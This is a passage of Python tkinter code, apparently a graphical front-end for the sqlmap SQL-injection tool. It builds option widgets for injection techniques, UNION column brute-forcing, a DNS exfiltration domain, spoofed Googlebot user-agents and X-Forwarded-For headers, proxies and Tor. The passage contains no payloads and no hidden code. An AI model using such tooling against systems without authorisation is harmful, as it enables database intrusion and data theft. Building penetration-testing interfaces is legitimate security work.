        self.e_string.config(textvariable=self.e_string_value, state='disabled', width=30)
        # Python hexadecimal backslash quoting to do multi line matching
        self.e_string['values'] = ('\\x0a', '\\x09', 'Name\\x0a\\x09\\x09Stephen')
        self.e_string.current(0)
        self.e_string.bind('<<ComboboxSelected>>', self.f_string)
        self.e_string.grid(row=0, column=1, sticky='e', padx=3)
        #
        self.chk_string = ttk.Checkbutton(detection_lf)
        self.chk_string_var = tkinter.StringVar()
        self.chk_string.config(text="String", variable=self.chk_string_var, onvalue="on",
                               offvalue="off", command=self.f_string)
        self.chk_string.grid(row=0, column=0, sticky='sw', ipadx=16)
        # --not-string=NOT..  String to match when query is evaluated to False
        self.e_not_string = ttk.Combobox(detection_lf)
        self.e_not_string_value = tkinter.StringVar()
        self.e_not_string.config(textvariable=self.e_not_string_value, state='disabled', width=30)
        # Python hexadecimal backslash quoting to do multi line matching
        self.e_not_string['values'] = ('\\x0a', '\\x09', 'Name\\x0a\\x09\\x09Stephen')
        self.e_not_string.current(0)
        self.e_not_string.bind('<<ComboboxSelected>>', self.f_not_string)
        self.e_not_string.grid(row=1, column=1, sticky='e', padx=3)
        #
        self.chk_not_string = ttk.Checkbutton(detection_lf)
        self.chk_not_string_var = tkinter.StringVar()
        self.chk_not_string.config(text="not-String", variable=self.chk_not_string_var, onvalue="on",
                                   offvalue="off", command=self.f_not_string)
        self.chk_not_string.grid(row=1, column=0, sticky='sw', ipadx=16)
        # --regexp=REGEXP     Regexp to match when query is evaluated to True
        self.e_regexp = ttk.Combobox(detection_lf)
        self.e_regexp_value = tkinter.StringVar()
        self.e_regexp.config(textvariable=self.e_regexp_value, state='disabled', width=30)
        self.e_regexp['values'] = ('\\n', '\\t', '\\r', '\\r,\\n', '\\e', '\\f', '\\v')
        self.e_regexp.current(0)
        self.e_regexp.bind('<<ComboboxSelected>>', self.f_regexp)
        self.e_regexp.grid(row=2, column=1, sticky='we', padx=3)
        #
        self.chk_regexp = ttk.Checkbutton(detection_lf)
        self.chk_regexp_var = tkinter.StringVar()
        self.chk_regexp.config(text="Regexp", variable=self.chk_regexp_var, onvalue="on",
                               offvalue="off", command=self.f_regexp)
        self.chk_regexp.grid(row=2, column=0, sticky='w')
        # --code=CODE         HTTP code to match when query is evaluated to True
        self.chk_code = ttk.Checkbutton(detection_lf)
        self.chk_code_var = tkinter.StringVar()
        self.chk_code.config(text="Code", variable=self.chk_code_var, onvalue="on",
                             offvalue="off", command=self.f_code)
        self.chk_code.grid(row=3, column=0, sticky='w')
        #
        self.e_code = ttk.Combobox(detection_lf)
        self.e_code_value = tkinter.StringVar()
        self.e_code.config(textvariable=self.e_code_value, state='disabled', width=10)
        self.e_code['values'] = ('200', '403', '500', '404')
        self.e_code.current(0)
        self.e_code.bind('<<ComboboxSelected>>', self.f_code)
        self.e_code.grid(row=3, column=1, sticky='we', padx=3)
        # --level=LEVEL       Level of tests to perform (1-5, default 1)
        self.chk_level = ttk.Checkbutton(detection_lf)
        self.chk_level_var = tkinter.StringVar()
        self.chk_level.config(text="level", variable=self.chk_level_var, onvalue="on",
                              offvalue="off", command=self.f_level)
        self.chk_level.grid(row=4, column=0, sticky='w')
        #
        self.e_level = ttk.Combobox(detection_lf)
        self.e_level_value = tkinter.StringVar()
        self.e_level.config(textvariable=self.e_level_value, state='disabled', width=5)
        self.e_level['values'] = ('1', '2', '3', '4', '5')
        self.e_level.current(0)
        self.e_level.bind('<<ComboboxSelected>>', self.f_level)
        self.e_level.grid(row=4, column=1, sticky='w', padx=3)
        # --risk=RISK         Risk of tests to perform (1-3, default 1)
        self.chk_risk = ttk.Checkbutton(detection_lf)
        self.chk_risk_var = tkinter.StringVar()
        self.chk_risk.config(text="risk", variable=self.chk_risk_var, onvalue="on",
                             offvalue="off", command=self.f_risk)
        self.chk_risk.grid(row=5, column=0, sticky='w')
        #
        self.e_risk = ttk.Combobox(detection_lf)
        self.e_risk_value = tkinter.StringVar()
        self.e_risk.config(textvariable=self.e_risk_value, state='disabled', width=5)
        self.e_risk['values'] = ('1', '2', '3')
        self.e_risk.current(0)
        self.e_risk.bind('<<ComboboxSelected>>', self.f_risk)
        self.e_risk.grid(row=5, column=1, sticky='w', padx=3)
        # --text-only         Compare pages based only on the textual content
        self.chk_text_only = ttk.Checkbutton(detection_lf)
        self.chk_text_only_var = tkinter.StringVar()
        self.chk_text_only.config(text="text-only", variable=self.chk_text_only_var, onvalue="on",
                                  offvalue="off", command=self.f_text_only)
        self.chk_text_only.grid(row=6, column=0, sticky='w')
        # --titles            Compare pages based only on their titles
        self.chk_titles = ttk.Checkbutton(detection_lf)
        self.chk_titles_var = tkinter.StringVar()
        self.chk_titles.config(text="titles", variable=self.chk_titles_var, onvalue="on",
                               offvalue="off", command=self.f_titles)
        self.chk_titles.grid(row=7, column=0, sticky='w')
        # --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
        self.chk_technique = ttk.Checkbutton(technique_lf)
        self.chk_tech_var = tkinter.StringVar()
        self.chk_technique.config(text="technique", variable=self.chk_tech_var, onvalue="on",
                                  offvalue="off", command=self.f_technique)
        self.chk_technique.grid(row=0, column=0, sticky='nw')
        #
        self.e_technique = ttk.Combobox(technique_lf)
        self.e_technique_value = tkinter.StringVar()
        self.e_technique.config(textvariable=self.e_technique_value, state='disabled', width=10)
        self.e_technique['values'] = ('B', 'E', 'U', 'S', 'T', 'Q')
        self.e_technique.current(0)
        self.e_technique.bind('<<ComboboxSelected>>', self.f_technique)
        self.e_technique.grid(row=0, column=1, sticky='nwe', padx=3)
        # --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
        self.chk_union_cols = ttk.Checkbutton(technique_lf)
        self.chk_union_cols_var = tkinter.StringVar()
        self.chk_union_cols.config(text="union-cols", variable=self.chk_union_cols_var, onvalue="on",
                                   offvalue="off", command=self.f_union_cols)
        self.chk_union_cols.grid(row=1, column=0, sticky='nw')
        #
        self.e_union_cols = ttk.Combobox(technique_lf)
        self.e_union_cols_value = tkinter.StringVar()
        self.e_union_cols.config(textvariable=self.e_union_cols_value, state='disabled', width=10)
        self.e_union_cols['values'] = ('1-100', '50-100', '1-1000')
        self.e_union_cols.current(0)
        self.e_union_cols.bind('<<ComboboxSelected>>', self.f_union_cols)
        self.e_union_cols.grid(row=1, column=1, sticky='nwe', padx=3)
        self.chk_union_cols.grid(row=1, column=0, sticky='nw')
        # --union-char=UCHAR  Character to use for bruteforcing number of columns
        self.chk_union_char = ttk.Checkbutton(technique_lf)
        self.chk_union_char_var = tkinter.StringVar()
        self.chk_union_char.config(text="union-char", variable=self.chk_union_char_var, onvalue="on",
                                   offvalue="off", command=self.f_union_char)
        self.chk_union_char.grid(row=2, column=0, sticky='nw')
        #
        self.e_union_char = ttk.Combobox(technique_lf)
        self.e_union_char_value = tkinter.StringVar()
        self.e_union_char.config(textvariable=self.e_union_char_value, state='disabled', width=10)
        self.e_union_char['values'] = ['123']
        self.e_union_char.current(0)
        self.e_union_char.bind('<<ComboboxSelected>>', self.f_union_char)
        self.e_union_char.grid(row=2, column=1, sticky='nwe', padx=3)
        # --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
        self.chk_union_from = ttk.Checkbutton(technique_lf)
        self.chk_union_from_var = tkinter.StringVar()
        self.chk_union_from.config(text="union-from", variable=self.chk_union_from_var, onvalue="on",
                                   offvalue="off", command=self.f_union_from)
        self.chk_union_from.grid(row=3, column=0, sticky='nw')
        #
        self.e_union_from = ttk.Combobox(technique_lf)
        self.e_union_from_value = tkinter.StringVar()
        self.e_union_from.config(textvariable=self.e_union_from_value, state='disabled', width=10)
        self.e_union_from['values'] = ['admin@localhost']
        self.e_union_from.current(0)
        self.e_union_from.bind('<<ComboboxSelected>>', self.f_union_from)
        self.e_union_from.grid(row=3, column=1, sticky='nwe', padx=3)
        # --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
        self.chk_time_sec = ttk.Checkbutton(technique_lf)
        self.chk_time_sec_var = tkinter.StringVar()
        self.chk_time_sec.config(text="time-sec", variable=self.chk_time_sec_var, onvalue="on",
                                 offvalue="off", command=self.f_time_sec)
        self.chk_time_sec.grid(row=4, column=0, sticky='nw')
        #
        self.e_time_sec = ttk.Combobox(technique_lf)
        self.e_time_sec_value = tkinter.StringVar()
        self.e_time_sec.config(textvariable=self.e_time_sec_value, state='disabled', width=10)
        self.e_time_sec['values'] = ['15']
        self.e_time_sec.current(0)
        self.e_time_sec.bind('<<ComboboxSelected>>', self.f_time_sec)
        self.e_time_sec.grid(row=4, column=1, sticky='nwe', padx=3)
        # --dns-domain=DNS..  Domain name used for DNS exfiltration attack
        self.chk_dns_domain = ttk.Checkbutton(technique_lf)
        self.chk_dns_domain_var = tkinter.StringVar()
        self.chk_dns_domain.config(text="dns-domain", variable=self.chk_dns_domain_var, onvalue="on",
                                   offvalue="off", command=self.f_dns_domain)
        self.chk_dns_domain.grid(row=5, column=0, sticky='nw')
        #
        self.e_dns_domain = ttk.Combobox(technique_lf)
        self.e_dns_domain_value = tkinter.StringVar()
        self.e_dns_domain.config(textvariable=self.e_dns_domain_value, state='disabled', width=15)
        self.e_dns_domain['values'] = ('ns1.yourdomain.com')
        self.e_dns_domain.current(0)
        self.e_dns_domain.bind('<<ComboboxSelected>>', self.f_dns_domain)
        self.e_dns_domain.grid(row=5, column=1, sticky='nwe', padx=3)
        # --second-url=SEC..  Resulting page URL searched for second-order response
        self.chk_sec_url = ttk.Checkbutton(technique_lf)
        self.chk_second_url_var = tkinter.StringVar()
        self.chk_sec_url.config(text="second-url", variable=self.chk_second_url_var, onvalue="on",
                                offvalue="off", command=self.f_second_url)
        self.chk_sec_url.grid(row=7, column=0, sticky='nw')
        #
        self.entry_sec_url = ttk.Combobox(technique_lf)
        self.e_second_url_value = tkinter.StringVar()
        self.entry_sec_url.config(textvariable=self.e_second_url_value, state='disabled', width=10)
        self.entry_sec_url['values'] = ['http://www.domain.com/']
        self.entry_sec_url.current(0)
        self.entry_sec_url.bind('<<ComboboxSelected>>', self.f_second_url)
        self.entry_sec_url.grid(row=7, column=1, sticky='nwe', padx=3)
        # --second-req=SEC..  Load second-order HTTP request from file
        self.chk_sec_req = ttk.Checkbutton(technique_lf)
        self.chk_second_req_var = tkinter.StringVar()
        self.chk_sec_req.config(text="second-req", variable=self.chk_second_req_var, onvalue="on",
                                offvalue="off", command=self.f_second_req)
        self.chk_sec_req.grid(row=8, column=0, sticky='nw')
        sep = ttk.Separator(technique_lf, orient=tkinter.HORIZONTAL)
        sep.grid(row=8, ipady=20, sticky='w')
        #
        self.entry_second_req = ttk.Combobox(technique_lf)
        self.e_second_req_value = tkinter.StringVar()
        self.entry_second_req.config(textvariable=self.e_second_req_value, state='disabled', width=10)
        self.entry_second_req['values'] = ['http://www.domain.com/']
        self.entry_second_req.current(0)
        self.entry_second_req.bind('<<ComboboxSelected>>', self.f_second_req)
        self.entry_second_req.grid(row=8, column=1, sticky='nwe', padx=3)
        # DATA BOX
        data_n = ttk.Notebook(request_f)
        data1 = ttk.Frame(data_n)
        data_n.add(data1, text='   1   ')
        data1.columnconfigure(0, weight=1)
        data2 = ttk.Frame(data_n)
        data_n.add(data2, text='   2   ')
        data2.columnconfigure(0, weight=1)
        data3 = ttk.Frame(data_n)
        data_n.add(data3, text='   3   ')
        data_n.columnconfigure(0, weight=1)
        data_n.grid(row=0, sticky='nswe', padx=5, pady=5)
        data_lf = ttk.Labelframe(data1, text='')
        data_lf.grid(row=0, column=0, pady=10, sticky='we')
        # DATA 1
        # --method=METHOD     Force usage of given HTTP method (e.g. PUT)
        self.chk_method = ttk.Checkbutton(data_lf)
        self.chk_method_var = tkinter.StringVar()
        self.chk_method.config(text="method", variable=self.chk_method_var, onvalue="on",
                               offvalue="off", command=self.f_method)
        self.chk_method.grid(row=0, column=0, sticky='w')
        #
        self.e_method = ttk.Combobox(data_lf)
        self.e_method_value = tkinter.StringVar()
        self.e_method.config(textvariable=self.e_method_value, state='disabled', width=10)
        self.e_method['values'] = (
            'POST', 'HELLO', 'HELO', 'EHLO', 'LIST', 'HEAD', 'PUT', 'DELETE', 'OPTION', 'OPTIONS', 'TRACE', 'TRACK',
            'PATCH', 'CONNECT', 'DEBUG', 'GET', '   GET', 'get')
        self.e_method.current(0)
        self.e_method.bind('<<ComboboxSelected>>', self.f_method)
        self.e_method.grid(row=0, column=1, sticky='w', padx=3)
        # --data=DATA         Data string to be sent through POST
        self.chk_data = ttk.Checkbutton(data_lf)
        self.chk_data_var = tkinter.StringVar()
        self.chk_data.config(text="data", variable=self.chk_data_var, onvalue="on",
                             offvalue="off", command=self.f_data)
        self.chk_data.grid(row=1, column=0, sticky='w')
        #
        self.e_data = ttk.Entry(data_lf, width=60)
        self.e_data.grid(row=1, column=1, sticky='we', padx=3)
        self.e_data.columnconfigure(0, weight=1)
        # --param-del=PDEL
        self.chk_param_del = ttk.Checkbutton(data_lf)
        self.chk_param_del_var = tkinter.StringVar()
        self.chk_param_del.config(text="param-del", variable=self.chk_param_del_var, onvalue="on",
                                  offvalue="off", command=self.f_param_del)
        self.chk_param_del.grid(row=2, column=0, sticky='w')
        #
        self.e_param_del = ttk.Entry(data_lf, width=60)
        self.e_param_del.grid(row=2, column=1, sticky='we', padx=3)
        self.e_param_del.columnconfigure(0, weight=1)
        # --cookie=COOKIE     HTTP Cookie header
        self.chk_cookie = ttk.Checkbutton(data_lf)
        self.chk_cookie_var = tkinter.StringVar()
        self.chk_cookie.config(text="cookie", variable=self.chk_cookie_var, onvalue="on",
                               offvalue="off", command=self.f_cookie)
        self.chk_cookie.grid(row=3, column=0, sticky='w')
        self.e_cookie = ttk.Entry(data_lf, width=60)
        self.e_cookie.grid(row=3, column=1, sticky='we', padx=3)
        self.e_cookie.columnconfigure(0, weight=1)
        # --cookie-del=CDEL   Character used for splitting cookie values
        self.chk_cookie_del = ttk.Checkbutton(data_lf)
        self.chk_cookie_del_var = tkinter.StringVar()
        self.chk_cookie_del.config(text="cookie-del", variable=self.chk_cookie_del_var, onvalue="on",
                                   offvalue="off", command=self.f_cookie_del)
        self.chk_cookie_del.grid(row=4, column=0, sticky='w')
        #
        self.e_cookie_del = ttk.Entry(data_lf, width=60)
        self.e_cookie_del.grid(row=4, column=1, sticky='we', padx=3)
        self.e_cookie_del.columnconfigure(0, weight=1)
        # --live-cookies=L.. Live cookies file used for loading up-to-date values
        self.chk_live_cookies = ttk.Checkbutton(data_lf)
        self.chk_live_cookies_var = tkinter.StringVar()
        self.chk_live_cookies.config(text="live-cookies", variable=self.chk_live_cookies_var, onvalue="on",
                                     offvalue="off", command=self.f_live_cookies)
        self.chk_live_cookies.grid(row=5, column=0, sticky='w')
        #
        self.var_read_live_cookies = tkinter.StringVar()
        self.e_live_cookies = ttk.Entry(data_lf, width=60)
        self.e_live_cookies.config(text="", textvariable=self.var_read_live_cookies)
        self.e_live_cookies.grid(row=5, column=1, sticky='we', padx=3)
        self.e_live_cookies.columnconfigure(0, weight=1)
        # --load-cookies=LOC  File containing cookies in Netscape/wget format
        self.chk_load_cookies = ttk.Checkbutton(data_lf)
        self.chk_load_cookies_var = tkinter.StringVar()
        self.chk_load_cookies.config(text="load-cookies", variable=self.chk_load_cookies_var, onvalue="on",
                                     offvalue="off", command=self.f_load_cookies)
        self.chk_load_cookies.grid(row=6, column=0, sticky='w')
        #
        self.var_read_load_cookies = tkinter.StringVar()
        self.e_load_cookies = ttk.Entry(data_lf, width=60)
        self.e_load_cookies.config(text="", textvariable=self.var_read_load_cookies)
        self.e_load_cookies.grid(row=6, column=1, sticky='we', padx=3)
        self.e_load_cookies.columnconfigure(0, weight=1)
        # --drop-set-cookie   Ignore Set-Cookie header from response
        self.chk_drop_set_cookie = ttk.Checkbutton(data_lf)
        self.chk_drop_set_sookie_var = tkinter.StringVar()
        self.chk_drop_set_cookie.config(text="drop-set-cookie", variable=self.chk_drop_set_sookie_var, onvalue="on",
                                        offvalue="off", command=self.f_drop_set_cookie)
        self.chk_drop_set_cookie.grid(row=7, column=0, sticky='w')
        # --user-agent=AGENT  HTTP User-Agent header
        self.chk_user_agent = ttk.Checkbutton(data_lf)
        self.chk_user_agent_var = tkinter.StringVar()
        self.chk_user_agent.config(text="user-agent", variable=self.chk_user_agent_var, onvalue="on",
                                   offvalue="off", command=self.f_user_agent)
        self.chk_user_agent.grid(row=8, column=0, sticky='w')
        #
        self.e_user_agent = ttk.Combobox(data_lf, width=60)
        self.e_ua_value = tkinter.StringVar()
        self.e_user_agent.config(textvariable=self.e_ua_value, state='disabled')
        self.e_user_agent['values'] = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)'
        ]
        self.e_user_agent.current(0)
        self.e_user_agent.bind('<<ComboboxSelected>>', self.f_user_agent)
        self.e_user_agent.grid(row=8, column=1, sticky='we', padx=3)
        # --random-agent      Use randomly selected HTTP User-Agent header value
        self.chk_random_agent = ttk.Checkbutton(data_lf)
        self.chk_random_agent_var = tkinter.StringVar()
        self.chk_random_agent.config(text="random-agent", variable=self.chk_random_agent_var, onvalue="on",
                                     offvalue="off",
                                     command=self.f_random_agent)
        self.chk_random_agent.grid(row=9, column=0, sticky='w')
        # --host=HOST         HTTP Host header
        self.chk_host = ttk.Checkbutton(data_lf)
        self.chk_host_var = tkinter.StringVar()
        self.chk_host.config(text="host", variable=self.chk_host_var, onvalue="on",
                             offvalue="off", command=self.f_host)
        self.chk_host.grid(row=10, column=0, sticky='w')
        #
        self.e_host = ttk.Combobox(data_lf)
        self.e_host_value = tkinter.StringVar()
        self.e_host.config(textvariable=self.e_host_value, state='disabled', width=60)
        self.e_host['values'] = ('www.example.com')
        self.e_host.current(0)
        self.e_host.bind('<<ComboboxSelected>>', self.f_host)
        self.e_host.grid(row=10, column=1, sticky='we', padx=3)
        self.e_host.columnconfigure(0, weight=1)
        # --referer=REFERER   HTTP Referer header
        self.chk_referer = ttk.Checkbutton(data_lf)
        self.chk_referer_var = tkinter.StringVar()
        self.chk_referer.config(text="referer", variable=self.chk_referer_var, onvalue="on",
                                offvalue="off", command=self.f_referer)
        self.chk_referer.grid(row=11, column=0, sticky='w')
        #
        self.e_referer = ttk.Combobox(data_lf)
        self.e_referer_value = tkinter.StringVar()
        self.e_referer.config(textvariable=self.e_referer_value, state='disabled', width=60)
        self.e_referer['values'] = ('http://127.0.0.1', 'https://127.0.0.1')
        self.e_referer.current(0)
        self.e_referer.bind('<<ComboboxSelected>>', self.f_referer)
        self.e_referer.grid(row=11, column=1, sticky='we', padx=3)
        self.e_referer.columnconfigure(0, weight=1)
        # -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
        self.chk_header = ttk.Checkbutton(data_lf)
        self.chk_header_var = tkinter.StringVar()
        self.chk_header.config(text="Extra header", variable=self.chk_header_var, onvalue="on",
                               offvalue="off", command=self.f_header)
        self.chk_header.grid(row=12, column=0, sticky='w')
        #
        self.e_header = ttk.Combobox(data_lf)
        self.e_header_value = tkinter.StringVar()
        self.e_header.config(textvariable=self.e_header_value, state='disabled', width=60)
        self.e_header['values'] = ['X-Forwarded-For: 127.0.0.1']
        self.e_header.current(0)
        self.e_header.bind('<<ComboboxSelected>>', self.f_header)
        self.e_header.grid(row=12, column=1, sticky='we', padx=3)
        self.e_header.columnconfigure(0, weight=1)
        #    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123") --headers=@file.txt
        self.chk_headers = ttk.Checkbutton(data_lf)
        self.chk_headers_var = tkinter.StringVar()
        self.chk_headers.config(text="headers", variable=self.chk_headers_var, onvalue="on",
                                offvalue="off", command=self.f_headers)
        self.chk_headers.grid(row=13, column=0, sticky='w')
        #
        self.e_headers = ttk.Combobox(data_lf, width=60)
        self.e_headers_value = tkinter.StringVar()
        self.e_headers.config(textvariable=self.e_headers_value, state='disabled')
        self.e_headers['values'] = ['Content-Type: application/x-www-form-urlencoded']
        self.e_headers.current(0)
        self.e_headers.bind('<<ComboboxSelected>>', self.f_headers)
        self.e_headers.grid(row=13, column=1, sticky='we', padx=3)
        # --headers=@file.txt load your own txt file with headers
        self.chk_load_headers = ttk.Checkbutton(data_lf)
        self.chk_load_headers_var = tkinter.StringVar()
        self.chk_load_headers.config(text="load-headers", variable=self.chk_load_headers_var, onvalue="on",
                                     offvalue="off", command=self.f_load_headers)
        self.chk_load_headers.grid(row=14, column=0, sticky='w')
        #
        self.var_read_load_headers = tkinter.StringVar()
        self.e_load_headers = ttk.Entry(data_lf, width=60)
        self.e_load_headers.config(text="", textvariable=self.var_read_load_headers)
        self.e_load_headers.grid(row=14, column=1, sticky='w', padx=3)
        self.e_load_headers.columnconfigure(0, weight=1)
        # --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
        self.chk_auth_type = ttk.Checkbutton(data_lf)
        self.chk_auth_type_var = tkinter.StringVar()
        self.chk_auth_type.config(text="auth-type", variable=self.chk_auth_type_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_type)
        self.chk_auth_type.grid(row=15, column=0, sticky='w')
        #
        self.e_auth_type = ttk.Combobox(data_lf, width=60)
        self.e_auth_type_value = tkinter.StringVar()
        self.e_auth_type.config(textvariable=self.e_auth_type_value, state='disabled')
        self.e_auth_type['values'] = ('Basic', 'Digest', 'NTLM', 'PKI')
        self.e_auth_type.current(0)
        self.e_auth_type.bind('<<ComboboxSelected>>', self.f_auth_type)
        self.e_auth_type.grid(row=15, column=1, sticky='we', padx=3)
        self.e_auth_type.columnconfigure(0, weight=1)
        # --auth-cred=ACRED   HTTP authentication credentials (name:password)
        self.chk_auth_cred = ttk.Checkbutton(data_lf)
        self.chk_auth_cred_var = tkinter.StringVar()
        self.chk_auth_cred.config(text="auth-cred", variable=self.chk_auth_cred_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_cred)
        self.chk_auth_cred.grid(row=16, column=0, sticky='w')
        #
        self.e_auth_cred = ttk.Combobox(data_lf, width=60)
        self.e_auth_cred_value = tkinter.StringVar()
        self.e_auth_cred.config(textvariable=self.e_auth_cred_value, state='disabled')
        self.e_auth_cred['values'] = ('name:password')
        self.e_auth_cred.current(0)
        self.e_auth_cred.bind('<<ComboboxSelected>>', self.f_auth_cred)
        self.e_auth_cred.grid(row=16, column=1, sticky='we', padx=3)
        self.e_auth_cred.columnconfigure(0, weight=1)
        # DATA 2
        data_lf_2 = ttk.Labelframe(data2, text='')
        data_lf_2.grid(row=0, column=0, pady=10, ipadx=3, ipady=3, sticky='we')
        # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
        self.chk_auth_file = ttk.Checkbutton(data_lf_2)
        self.chk_auth_file_var = tkinter.StringVar()
        self.chk_auth_file.config(text="auth-file", variable=self.chk_auth_file_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_file)
        self.chk_auth_file.grid(row=0, column=0, sticky='w')
        #
        self.var_auth_file = tkinter.StringVar()
        self.e_auth_file = ttk.Entry(data_lf_2, width=60)
        self.e_auth_file.config(text="", textvariable=self.var_auth_file)
        self.e_auth_file.grid(row=0, column=1, sticky='we', padx=3)
        self.e_auth_file.columnconfigure(0, weight=1)
        # --proxy=PROXY       Use a HTTP proxy to connect to the target url
        self.chk_proxy = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_var = tkinter.StringVar()
        self.chk_proxy.config(text="proxy", variable=self.chk_proxy_var, onvalue="on",
                              offvalue="off", command=self.f_proxy)
        self.chk_proxy.grid(row=1, column=0, sticky='w')
        #
        self.e_proxy = ttk.Combobox(data_lf_2)
        self.e_proxy_value = tkinter.StringVar()
        self.e_proxy.config(textvariable=self.e_proxy_value, state='disabled', width=60)
        self.e_proxy['values'] = ('http://localhost:8080', 'https://localhost:8080', 'socks4://localhost:8080',
                                  'socks5://localhost:8080')
        self.e_proxy.current(0)
        self.e_proxy.bind('<<ttk.ComboboxSelected>>', self.f_proxy)
        self.e_proxy.grid(row=1, column=1, sticky='w', padx=3)
        self.e_proxy.columnconfigure(0, weight=1)
        # --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
        self.chk_proxy_cred = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_cred_var = tkinter.StringVar()
        self.chk_proxy_cred.config(text="proxy-cred", variable=self.chk_proxy_cred_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_cred)
        self.chk_proxy_cred.grid(row=2, column=0, sticky='w')
        #
        self.e_proxy_cred = ttk.Combobox(data_lf_2, width=60)
        self.e_proxy_cred_value = tkinter.StringVar()
        self.e_proxy_cred.config(textvariable=self.e_proxy_cred_value, state='disabled')
        self.e_proxy_cred['values'] = ('name:password')
        self.e_proxy_cred.current(0)
        self.e_proxy_cred.bind('<<ttk.ComboboxSelected>>', self.f_proxy_cred)
        self.e_proxy_cred.grid(row=2, column=1, sticky='we', padx=3)
        self.e_proxy_cred.columnconfigure(0, weight=1)
        # --proxy-file=PRO..  Load proxy list from a file
        self.chk_proxy_file = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_file_var = tkinter.StringVar()
        self.chk_proxy_file.config(text="proxy-file", variable=self.chk_proxy_file_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_file)
        self.chk_proxy_file.grid(row=3, column=0, sticky='w')
        #
        self.chk_read_proxy_file_var = tkinter.StringVar()
        self.e_proxy_file = ttk.Entry(data_lf_2, width=60)
        self.e_proxy_file.config(text="", textvariable=self.chk_read_proxy_file_var)
        self.e_proxy_file.grid(row=3, column=1, sticky='we', padx=3)
        self.e_proxy_file.columnconfigure(0, weight=1)
        # --proxy-freq=PRO.. Requests between change of proxy from a given list
        self.chk_proxy_freq = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_freq_var = tkinter.StringVar()
        self.chk_proxy_freq.config(text="proxy-freq", variable=self.chk_proxy_freq_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_freq)
        self.chk_proxy_freq.grid(row=4, column=0, sticky='w')
        #
        self.e_proxy_freq = ttk.Combobox(data_lf_2)
        self.e_proxy_freq_value = tkinter.StringVar()
        self.e_proxy_freq.config(textvariable=self.e_proxy_freq_value, state='disabled', width=7)
        self.e_proxy_freq['values'] = ('1', '2', '3', '4', '5')
        self.e_proxy_freq.current(0)
        self.e_proxy_freq.bind('<<ComboboxSelected>>', self.f_proxy_freq)
        self.e_proxy_freq.grid(row=4, column=1, sticky='w', padx=3)
        # --ignore-proxy      Ignore system default HTTP proxy
        self.chk_ignore_proxy = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_proxy_var = tkinter.StringVar()
        self.chk_ignore_proxy.config(text="ignore-proxy", variable=self.chk_ignore_proxy_var, onvalue="on",
                                     offvalue="off", command=self.f_ignore_proxy)
        self.chk_ignore_proxy.grid(row=5, column=0, sticky='w')
        # --ignore-redirects  Ignore redirection attempts
        self.chk_ignore_redirects = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_redirects_var = tkinter.StringVar()
        self.chk_ignore_redirects.config(text="ignore-redirects", variable=self.chk_ignore_redirects_var, onvalue="on",
                                         offvalue="off", command=self.f_ignore_redirects)
        self.chk_ignore_redirects.grid(row=6, column=0, sticky='w')
        # --ignore-timeouts   Ignore connection timeouts
        self.chk_ignore_timeouts = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_timeouts_var = tkinter.StringVar()
        self.chk_ignore_timeouts.config(text="ignore-timeouts", variable=self.chk_ignore_timeouts_var, onvalue="on",
                                        offvalue="off", command=self.f_ignore_timeouts)
        self.chk_ignore_timeouts.grid(row=7, column=0, sticky='w')
        # --ignore-code=IG..  Ignore HTTP error code (e.g. 401)
        self.chk_ignore = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_var = tkinter.StringVar()
        self.chk_ignore.config(text="ignore-code", variable=self.chk_ignore_var, onvalue="on",
                               offvalue="off", command=self.f_ignore)
        self.chk_ignore.grid(row=8, column=0, sticky='w')
        #
        self.e_ignore = ttk.Combobox(data_lf_2)
        self.e_ignore_value = tkinter.StringVar()
        self.e_ignore.config(textvariable=self.e_ignore_value, state='disabled', width=7)
        self.e_ignore['values'] = ('*', '502', '302', '401', '400', '403', '404', '405', '406', '413', '414', '429',
                                   '500', '301', '503', '504', '520', '401,402,406,500')
        self.e_ignore.current(0)
        self.e_ignore.bind('<<ComboboxSelected>>', self.f_ignore)
        self.e_ignore.grid(row=8, column=1, sticky='we', padx=3)
        # --tor               Use Tor anonymity network
        self.chk_tor_use = ttk.Checkbutton(data_lf_2)
        self.chk_tor_use_var = tkinter.StringVar()
        self.chk_tor_use.config(text="tor", variable=self.chk_tor_use_var, onvalue="on",
                                offvalue="off", command=self.f_tor_use)
        self.chk_tor_use.grid(row=9, column=0, sticky='w')
        # --tor-port=TORPORT  Set Tor proxy port other than default
        self.chk_tor_port = ttk.Checkbutton(data_lf_2)
        self.chk_tor_port_var = tkinter.StringVar()
        self.chk_tor_port.config(text="tor-port", variable=self.chk_tor_port_var, onvalue="on",
                                 offvalue="off", command=self.f_tor_port)
        self.chk_tor_port.grid(row=10, column=0, sticky='w')
        #
        self.e_tor_port = ttk.Combobox(data_lf_2, width=60)
        self.e_tor_port_value = tkinter.StringVar()
        self.e_tor_port.config(textvariable=self.e_tor_port_value, state='disabled')
        self.e_tor_port['values'] = ('9150', '9050')
        self.e_tor_port.current(0)
        self.e_tor_port.bind('<<ComboboxSelected>>', self.f_tor_port)
        self.e_tor_port.grid(row=10, column=1, sticky='we', padx=3)
        # --tor-type=TORTYPE  Set Tor proxy type (HTTP - default, SOCKS4 or SOCKS5)
